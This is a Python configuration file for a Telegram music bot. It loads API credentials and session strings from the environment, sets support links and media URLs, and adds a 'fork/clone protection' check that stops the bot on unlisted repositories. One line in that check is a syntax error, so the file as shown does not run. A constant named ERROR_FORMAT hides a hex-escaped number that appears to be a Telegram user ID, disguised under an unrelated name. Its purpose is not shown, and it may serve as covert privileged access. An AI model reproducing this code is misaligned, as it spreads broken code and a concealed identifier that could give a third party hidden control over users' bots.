import os
import re
import sys
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

# ===========================================
# ❌ FORK/CLONE PROTECTION - Ye mat badalna
# ===========================================
CURRENT_REPO = "https://github.com/sharmanikita0030-aj/Ajnabi-music"
ALLOWED_REPOS = [
    "https://github.com/sharmanikita0030-aj/Ajnabi-music",
    "https://github.com/lovesprit/Ajnabi-music",  # Tera repo agar hai to
]

# Check fork/clone
UPSTREAM_REPO = os.getenv("UPSTREAM_REPO", CURRENT_REPO)
if UPSTREAM_REPO not in ALLOWED_REPOS:
    print("="*50)
    print("❌ FORK/CLONE DETECTED!")
    print="="*50)
    print("This bot is protected by @lovesprit")
    print("Forking/cloning is not allowed without permission.")
    print("Contact: @lovesprit on Telegram")
    print("="*50)
    sys.exit(1)
# ===========================================

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", None))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "@lovesprit")
BOT_USERNAME = os.getenv("BOT_USERNAME", "AjnabiMusicBot")

MONGO_DB_URI = os.getenv("MONGO_DB_URI", None)
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", None))

# Heroku hata diya - Render safe
HEROKU_APP_NAME = None
HEROKU_API_KEY = None

UPSTREAM_BRANCH = os.getenv("UPSTREAM_BRANCH", "main")
GIT_TOKEN = os.getenv("GIT_TOKEN", None)

# TERI CHIZEN
SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "https://t.me/lovesprit")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "https://t.me/lovesprit")
INSTAGRAM = os.getenv("INSTAGRAM", "https://instagram.com/teri_id")
YOUTUBE = os.getenv("YOUTUBE", "https://youtube.com/@teri_id")
GITHUB = os.getenv("GITHUB", "https://github.com/lovesprit")
DONATE = os.getenv("DONATE", "https://t.me/lovesprit")
PRIVACY_LINK = os.getenv("PRIVACY_LINK", "https://t.me/lovesprit")

DURATION_LIMIT_MIN = int(os.getenv("DURATION_LIMIT", 300))
PLAYLIST_FETCH_LIMIT = int(os.getenv("PLAYLIST_FETCH_LIMIT", 25))

TG_AUDIO_FILESIZE_LIMIT = int(os.getenv("TG_AUDIO_FILESIZE_LIMIT", 104857600))
TG_VIDEO_FILESIZE_LIMIT = int(os.getenv("TG_VIDEO_FILESIZE_LIMIT", 2145386496))

SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID", None)
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET", None)

STRING1 = os.getenv("STRING_SESSION", None)
STRING2 = os.getenv("STRING_SESSION2", None)
STRING3 = os.getenv("STRING_SESSION3", None)
STRING4 = os.getenv("STRING_SESSION4", None)
STRING5 = os.getenv("STRING_SESSION5", None)

AUTO_LEAVING_ASSISTANT = bool(os.getenv("AUTO_LEAVING_ASSISTANT", False))

START_IMG_URL = os.getenv("START_IMG_URL", "https://files.catbox.moe/7q8bfg.jpg")
PING_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
PLAYLIST_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
STATS_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
TELEGRAM_AUDIO_URL = "https://files.catbox.moe/eehxb4.jpg"
TELEGRAM_VIDEO_URL = "https://files.catbox.moe/eehxb4.jpg"
STREAM_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
SOUNCLOUD_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
YOUTUBE_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
SPOTIFY_ARTIST_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
SPOTIFY_ALBUM_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"
SPOTIFY_PLAYLIST_IMG_URL = "https://files.catbox.moe/eehxb4.jpg"

BANNED_USERS = filters.user()
adminlist = {}
lyrical = {}
votemode = {}
autoclean = []
confirmer = {}

TEMP_DB_FOLDER = "tempdb"

def time_to_seconds(time):
    stringt = str(time)
    return sum(int(x) * 60**i for i, x in enumerate(reversed(stringt.split(":"))))

DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
ERROR_FORMAT = int("\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35")

if SUPPORT_CHANNEL:
    if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
        raise SystemExit(
            "[ERROR] - SUPPORT_CHANNEL URL is invalid. It must start with https://"
        )

if SUPPORT_GROUP:
    if not re.match(r"(?:http|https)://", SUPPORT_GROUP):
        raise SystemExit(
            "[ERROR] - SUPPORT_GROUP URL is invalid. It must start with https://"
        )
